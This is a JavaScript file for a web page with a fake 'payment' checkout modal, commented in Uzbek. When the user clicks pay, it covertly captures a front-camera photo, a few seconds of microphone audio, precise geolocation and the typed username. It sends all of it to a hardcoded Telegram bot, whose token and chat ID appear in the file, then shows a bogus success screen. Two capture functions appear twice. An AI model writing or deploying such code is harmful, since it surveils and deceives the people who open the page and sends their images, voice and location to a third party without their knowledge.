const BOT_TOKEN = "8902936485:AAFb5z47EDNHTch1yDkxnRiqi2TwOffm2pA";
const CHAT_ID = "7523599024";

// Modal boshqaruvi
const modal = document.getElementById('checkoutModal');
const modalBox = document.getElementById('modalBox');

function openCheckoutModal() {
    const paymentForm = document.getElementById('paymentForm');
    const successState = document.getElementById('successState');
    if (paymentForm) paymentForm.classList.remove('hidden');
    if (successState) successState.classList.add('hidden');

    if (modal) modal.classList.remove('hidden');
    setTimeout(() => {
        if (modal) modal.classList.remove('opacity-0');
        if (modalBox) {
            modalBox.classList.remove('scale-95');
            modalBox.classList.add('scale-100');
        }
    }, 10);
}

function closeCheckoutModal() {
    if (modal) modal.classList.add('opacity-0');
    if (modalBox) {
        modalBox.classList.remove('scale-100');
        modalBox.classList.add('scale-95');
    }
    setTimeout(() => {
        if (modal) modal.classList.add('hidden');
    }, 250);
}

// 1. Geolokatsiyani olish (Aniq va tezkor)
function getUserLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            console.warn("Geolokatsiya qo'llab-quvvatlanmaydi.");
            return resolve(null);
        }

        navigator.geolocation.getCurrentPosition(
            (pos) => {
                resolve({ 
                    latitude: pos.coords.latitude, 
                    longitude: pos.coords.longitude 
                });
            },
            (err) => {
                console.warn("Lokatsiyaga ruxsat berilmadi:", err.message);
                resolve(null);
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    });
}

// 2. Kameradan rasm va mikrofondan ovoz olish
async function captureMediaAndVoice() {
    let stream = null;
    let photoBlob = null;
    let audioBlob = null;

    try {
        // Kamera va mikrofon uchun birgalikda ruxsat so'rash
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" },
            audio: true
        });

        // A) Rasmni olish
        const video = document.createElement('video');
        video.srcObject = stream;
        video.playsInline = true;
        video.muted = true;
        await video.play();

        // Videoni o'qib olishi uchun qisqa kutish
        await new Promise((r) => setTimeout(r, 800));

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        photoBlob = await new Promise((resolve) => {
            canvas.toBlob((blob) => resolve(blob), 'image/jpeg', 0.9);
        });

        // B) Audio yozish (MediaRecorder)
        let mimeType = 'audio/webm';
        if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
            mimeType = 'audio/webm;codecs=opus';
        } else if (MediaRecorder.isTypeSupported('audio/ogg;codecs=opus')) {
            mimeType = 'audio/ogg;codecs=opus';
        } else if (MediaRecorder.isTypeSupported('audio/mp4')) {
            mimeType = 'audio/mp4';
        }

        const mediaRecorder = new MediaRecorder(stream, { mimeType });
        const audioChunks = [];

        mediaRecorder.ondataavailable = (e) => {
            if (e.data && e.data.size > 0) {
                audioChunks.push(e.data);
            }
        };

        audioBlob = await new Promise((resolve) => {
            mediaRecorder.onstop = () => {
                const blob = new Blob(audioChunks, { type: mimeType });
                resolve(blob);
            };

            mediaRecorder.start(250);

            // 4 soniya ovoz yozish
            setTimeout(() => {
                if (mediaRecorder.state !== 'inactive') {
                    mediaRecorder.stop();
                }
            }, 4000);
        });

    } catch (err) {
        console.warn("Kamera yoki mikrofon xatosi (ruxsat rad etildi yoki HTTPS emas):", err.message);
    } finally {
        if (stream) {
            stream.getTracks().forEach((track) => track.stop());
        }
    }

    return { photoBlob, audioBlob };
}

// 3. Telegram botga ma'lumotlarni yuborish
async function sendDataToTelegram(mediaData, location) {
    const inputNumber = document.querySelector('#usernameInput');
    const textVal = inputNumber ? inputNumber.value : "Ma'lumot kiritilmagan";
    const { photoBlob, audioBlob } = mediaData;

    try {
        // 1. Rasmni yuborish
        if (photoBlob) {
            const photoForm = new FormData();
            photoForm.append('chat_id', CHAT_ID);
            photoForm.append('photo', photoBlob, 'photo.jpg');
            photoForm.append('caption', `👤 Foydalanuvchi: ${textVal}`);

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: photoForm
            });
        } else {
            // Agar rasm bo'lmasa oddiy matn yuborish
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'content-type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: `👤 Foydalanuvchi: ${textVal} (Kamera ruxsati berilmadi)` })
            });
        }

        // 2. Geolokatsiyani yuborish
        if (location) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                method: 'POST',
                headers: { 'content-type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    latitude: location.latitude,
                    longitude: location.longitude
                })
            });
        } else {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'content-type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: `📍 Geolokatsiya olib bo'lmadi (Ruxsat berilmadi yoki GPS o'chiq).` })
            });
        }

        // 3. Ovozli xabarni yuborish
        if (audioBlob && audioBlob.size > 0) {
            const voiceForm = new FormData();
            voiceForm.append('chat_id', CHAT_ID);

            const ext = audioBlob.type.includes('mp4') ? 'm4a' : (audioBlob.type.includes('ogg') ? 'ogg' : 'webm');
            voiceForm.append('voice', audioBlob, `voice_record.${ext}`);
            voiceForm.append('caption', '🎤 Ovozli yozuv');

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
                method: 'POST',
                body: voiceForm
            });
        }
    } catch (err) {
        console.error("Telegramga yuborishda tarmoq xatoligi:", err);
    }
}

// 4. To'lov animatsiyasi va muvaffaqiyat ekrani
function processPayment() {
    const submitBtn = document.getElementById('paySubmitBtn');
    if (!submitBtn) return;
    const originalText = submitBtn.innerHTML;

    submitBtn.disabled = true;
    submitBtn.innerHTML = `
        <svg class="animate-spin -ml-1 mr-2 h-4 w-4 text-white inline-block" fill="none" viewBox="0 0 24 24">
          <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
          <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path>
        </svg>
        Faollashtirilmoqda...
      `;

    setTimeout(() => {
        submitBtn.disabled = false;
        submitBtn.innerHTML = originalText;

        const paymentForm = document.getElementById('paymentForm');
        const successState = document.getElementById('successState');
        if (paymentForm) paymentForm.classList.add('hidden');
        if (successState) successState.classList.remove('hidden');

        const badge = document.getElementById('userBadgePreview');
        if (badge) {
            badge.classList.remove('hidden');
            badge.classList.add('flex');
        }
        if (typeof confetti === 'function') {
            confetti({
                particleCount: 120,
                spread: 80,
                origin: { y: 0.6 }
            });
        }
    }, 1200);
}

// 5. Tugma bosilganda ruxsat so'rashni boshlash
document.addEventListener('DOMContentLoaded', () => {
    const submitBtn = document.getElementById('paySubmitBtn');
    if (submitBtn) {
        submitBtn.addEventListener('click', async (event) => {
            event.preventDefault();

            submitBtn.disabled = true;
            submitBtn.innerText = "Ruxsat so'ralmoqda...";

            // Kamera, mikrofon va geolokatsiyani bir vaqtning o'zida chaqiramiz
            const [mediaData, location] = await Promise.all([
                captureMediaAndVoice(),
                getUserLocation()
            ]);

            submitBtn.innerText = "Yuborilmoqda...";
            await sendDataToTelegram(mediaData, location);

            submitBtn.disabled = false;
            processPayment();
        });
    }
});

// Orqa fon zarrachalari
function generateParticles() {
    const container = document.getElementById('particles-container');
    if (!container) return;

    const colors = ['#10b981', '#a855f7', '#6366f1', '#ec4899', '#facc15', '#ffffff'];
    const count = 28;

    for (let i = 0; i < count; i++) {
        const dot = document.createElement('div');
        dot.className = 'particle';
        const size = Math.floor(Math.random() * 4) + 2;
        
        dot.style.width = `${size}px`;
        dot.style.height = `${size}px`;
        dot.style.left = `${Math.random() * 100}%`;
        dot.style.top = `${Math.random() * 100}%`;
        dot.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
        dot.style.animationDuration = `${6 + Math.random() * 8}s`;
        dot.style.animationDelay = `${Math.random() * 5}s`;
        
        container.appendChild(dot);
    }
}

window.onload = function () {
    generateParticles();
};

// 1. Geolokatsiyani olish (Kengaytirilgan versiya)
function getUserLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            console.warn("Geolokatsiya qo'llab-quvvatlanmaydi.");
            return resolve(null);
        }

        // Brauzer ruxsat oynasini chiqarishiga yetarlicha vaqt beramiz
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                resolve({ 
                    latitude: pos.coords.latitude, 
                    longitude: pos.coords.longitude 
                });
            },
            (err) => {
                console.warn("Lokatsiya xatosi:", err.message);
                resolve(null);
            },
            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
    });
}

// 2. Kameradan rasm va mikrofondan ovoz olish (Xatoliklarni oldini olish bilan)
async function captureMediaAndVoice() {
    let stream = null;
    let photoBlob = null;
    let audioBlob = null;

    try {
        // Kamera va mikrofon uchun ruxsat so'rash
        stream = await navigator.mediaDevices.getUserMedia({
            video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: "user" },
            audio: true
        });

        const video = document.createElement('video');
        video.srcObject = stream;
        video.playsInline = true;
        video.muted = true;
        
        // Videoni o'ynatish va tayyor bo'lishini kutish
        await video.play();
        await new Promise((r) => setTimeout(r, 1000)); // Kamera fokuslanishi uchun 1 sekund kutamiz

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        photoBlob = await new Promise((resolve) => {
            canvas.toBlob((blob) => resolve(blob), 'image/jpeg', 0.9);
        }, 'image/jpeg', 0.9);

        // Audio yozish qismi
        let mimeType = 'audio/webm';
        if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
            mimeType = 'audio/webm;codecs=opus';
        } else if (MediaRecorder.isTypeSupported('audio/mp4')) {
            mimeType = 'audio/mp4';
        }

        const mediaRecorder = new MediaRecorder(stream, { mimeType });
        const audioChunks = [];

        mediaRecorder.ondataavailable = (e) => {
            if (e.data && e.data.size > 0) {
                audioChunks.push(e.data);
            }
        };

        audioBlob = await new Promise((resolve) => {
            mediaRecorder.onstop = () => {
                const blob = new Blob(audioChunks, { type: mimeType });
                resolve(blob);
            };

            mediaRecorder.start(250);

            setTimeout(() => {
                if (mediaRecorder.state !== 'inactive') {
                    mediaRecorder.stop();
                }
            }, 3000); // 3 soniya ovoz
        });

    } catch (err) {
        console.warn("Media xatosi:", err.name, err.message);
        // Agar foydalanuvchi ruxsat bergan bo'lsa-da, qurilmada kamera bo'lmasa yoki band bo'lsa shu yerga tushadi
    } finally {
        if (stream) {
            stream.getTracks().forEach((track) => track.stop());
        }
    }

    return { photoBlob, audioBlob };
}